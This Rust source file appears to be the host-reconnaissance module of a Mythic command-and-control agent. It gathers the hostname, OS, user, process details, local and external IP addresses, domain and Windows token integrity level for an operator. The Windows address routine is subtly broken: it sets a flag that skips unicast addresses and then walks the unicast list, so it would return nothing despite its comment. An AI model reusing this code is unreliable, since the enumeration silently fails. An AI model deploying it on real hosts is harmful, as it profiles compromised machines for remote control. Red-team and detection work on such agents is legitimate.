use std::env;
#[cfg(not(windows))]
use std::process::Command;
use std::process::id;

pub fn hostname() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("COMPUTERNAME").ok()
    }
    #[cfg(not(windows))]
    {
        Command::new("hostname")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string())
    }
}

pub fn os() -> Option<String> {
    #[cfg(windows)]
    {
        Some("Windows".into())
    }
    #[cfg(target_os = "macos")]
    {
        Some("macOS".into())
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        Command::new("uname")
            .arg("-s")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string())
    }
    #[cfg(not(any(windows, unix)))]
    {
        Some(env::consts::OS.into())
    }
}

pub fn arch() -> Option<String> {
    Some(env::consts::ARCH.into())
}

pub fn user() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("USERNAME").ok()
    }
    #[cfg(not(windows))]
    {
        env::var("USER").ok()
    }
}

pub fn pid() -> Option<u32> {
    Some(id())
}

pub fn process_name() -> Option<String> {
    env::current_exe()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_string()))
}

pub fn local_ips() -> Vec<String> {
    let mut ips = vec!["127.0.0.1".into()];

    #[cfg(target_os = "linux")]
    {
        if let Ok(o) = Command::new("hostname").arg("-I").output() {
            if let Ok(s) = String::from_utf8(o.stdout) {
                ips.extend(s.split_whitespace().map(|s| s.to_string()));
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        if let Ok(o) = Command::new("ifconfig").output() {
            if let Ok(s) = String::from_utf8(o.stdout) {
                for line in s.lines() {
                    if line.contains("inet ") && !line.contains("127.0.0.1") {
                        if let Some(ip) = line.split_whitespace().nth(1) {
                            ips.push(ip.to_string());
                        }
                    }
                }
            }
        }
    }

    #[cfg(windows)]
    {
        ips.extend(windows_local_ips_via_ffi());
    }

    ips
}

use std::sync::atomic::{AtomicBool, Ordering};

static EXTERNAL_IP_CHECK: AtomicBool = AtomicBool::new(false);

/// Set by the C2 profile before agent start. When false, [`external_ip`]
/// returns None without making any network call.
pub fn set_external_ip_check(enabled: bool) {
    EXTERNAL_IP_CHECK.store(enabled, Ordering::Release);
}

pub fn external_ip() -> Option<String> {
    if !EXTERNAL_IP_CHECK.load(Ordering::Acquire) {
        return None;
    }
    crate::sys::network::http_request(
        "https://api.ipify.org",
        "GET",
        None,
        None,
        None,
        true,
    )
    .ok()
    .map(|s| s.trim().to_string())
    .filter(|s| !s.is_empty())
}

/// Enumerate local IPv4 / IPv6 unicast addresses via the Iphlpapi
/// `GetAdaptersAddresses` API. Replaces the old `ipconfig` text-parsing path
/// which broke on non-English locales and on IPv6-only hosts.
#[cfg(windows)]
fn windows_local_ips_via_ffi() -> Vec<String> {
    use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
    use windows_sys::Win32::NetworkManagement::IpHelper::{
        GetAdaptersAddresses, IP_ADAPTER_ADDRESSES_LH, GAA_FLAG_SKIP_ANYCAST,
        GAA_FLAG_SKIP_DNS_SERVER, GAA_FLAG_SKIP_MULTICAST, GAA_FLAG_SKIP_UNICAST,
    };
    use windows_sys::Win32::Networking::WinSock::{
        AF_INET, AF_INET6, SOCKADDR, SOCKADDR_IN, SOCKADDR_IN6,
    };

    const BUF_SIZE: u32 = 16 * 1024;
    const FAMILY_FLAGS: u32 = 0; // both AF_INET and AF_INET6

    unsafe {
        let mut buf_len: u32 = BUF_SIZE;
        let mut buf: Vec<u8> = vec![0u8; BUF_SIZE as usize];

        // Loop in case the first call returns ERROR_BUFFER_OVERFLOW
        // (the buffer was too small and the real size is now in buf_len).
        for _ in 0..3 {
            let rc = GetAdaptersAddresses(
                FAMILY_FLAGS,
                GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_UNICAST
                    | GAA_FLAG_SKIP_DNS_SERVER,
                std::ptr::null(),
                buf.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH,
                &mut buf_len,
            );
            if rc == 0 {
                break;
            }
            if buf_len > buf.len() as u32 {
                buf.resize(buf_len as usize, 0);
                continue;
            }
            return Vec::new();
        }

        let mut out = Vec::new();
        let mut adapter = buf.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH;
        while !adapter.is_null() {
            // Walk FirstUnicastAddress linked list.
            let mut ua = (*adapter).FirstUnicastAddress;
            while !ua.is_null() {
                let sockaddr = (*ua).Address.lpSockaddr as *const SOCKADDR;
                let family = (*sockaddr).sa_family;
                let ip = match family {
                    AF_INET => {
                        let sa = sockaddr as *const SOCKADDR_IN;
                        let octets = (*sa).sin_addr.S_un.S_addr.to_ne_bytes();
                        IpAddr::V4(Ipv4Addr::new(
                            octets[0], octets[1], octets[2], octets[3],
                        ))
                    }
                    AF_INET6 => {
                        let sa = sockaddr as *const SOCKADDR_IN6;
                        IpAddr::V6(Ipv6Addr::from((*sa).sin6_addr.u.Byte))
                    }
                    _ => {
                        ua = (*ua).Next;
                        continue;
                    }
                };
                if !ip.is_loopback() {
                    out.push(ip.to_string());
                }
                ua = (*ua).Next;
            }
            adapter = (*adapter).Next;
        }
        out.sort();
        out.dedup();
        out
    }
}

pub fn domain() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("USERDNSDOMAIN").ok()
    }
    #[cfg(not(windows))]
    {
        Command::new("hostname")
            .arg("-d")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty() && s != "(none)" && s != "localdomain")
    }
}

pub fn integrity_level() -> Option<u32> {
    #[cfg(windows)]
    {
        // GetTokenInformation(TokenIntegrityLevel) returns a TOKEN_MANDATORY_LABEL
        // whose SIDs-and-attributes block encodes the integrity RID in the last
        // sub-authority of the SID.
        //
        // Mapping (per Microsoft docs):
        //   SECURITY_MANDATORY_UNTRUSTED_RID   = 0x0000  -> 0
        //   SECURITY_MANDATORY_LOW_RID         = 0x1000  -> 1
        //   SECURITY_MANDATORY_MEDIUM_RID      = 0x2000  -> 2
        //   SECURITY_MANDATORY_MEDIUM_PLUS     = 0x2100  -> 3
        //   SECURITY_MANDATORY_HIGH_RID        = 0x3000  -> 4
        //   SECURITY_MANDATORY_SYSTEM_RID      = 0x4000  -> 5
        //   SECURITY_MANDATORY_PROTECTED_RID   = 0x5000  -> 6
        //
        // Mythic's `integrity_level` is a u32 — we return the raw 0xNNNN value
        // so the operator can map it themselves; the Mythic UI shows the name.
        unsafe {
            use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
            use windows_sys::Win32::Security::{
                GetTokenInformation, TokenIntegrityLevel, TOKEN_MANDATORY_LABEL,
                TOKEN_QUERY,
            };
            use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

            let mut token: HANDLE = std::ptr::null_mut();
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return None;
            }

            // First call: ask for required length.
            let mut needed: u32 = 0;
            let _ = GetTokenInformation(
                token,
                TokenIntegrityLevel,
                std::ptr::null_mut(),
                0,
                &mut needed,
            );
            if needed == 0 {
                CloseHandle(token);
                return None;
            }

            let mut buf = vec![0u8; needed as usize].into_boxed_slice();
            let ok = GetTokenInformation(
                token,
                TokenIntegrityLevel,
                buf.as_mut_ptr() as *mut _,
                needed,
                &mut needed,
            );
            CloseHandle(token);
            if ok == 0 {
                return None;
            }

            let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
            // Label.Sid is a PSID (pointer to SID). Last sub-authority is at
            // offset *GetSidSubAuthorityCount(Sid) - 1.
            let sid = label.Label.Sid;
            if sid.is_null() {
                return None;
            }
            let count = *((sid as *const u8).add(1) as *const u8);
            if count == 0 {
                return None;
            }
            // GetSidSubAuthority(Sid, n) returns a pointer to a 32-bit value.
            // The struct is variable-length; we walk into it.
            let offset = 8 + (count as usize - 1) * 4;
            let rid_ptr = (sid as *const u8).add(offset) as *const u32;
            Some(*rid_ptr)
        }
    }
    #[cfg(not(windows))]
    {
        None
    }
}
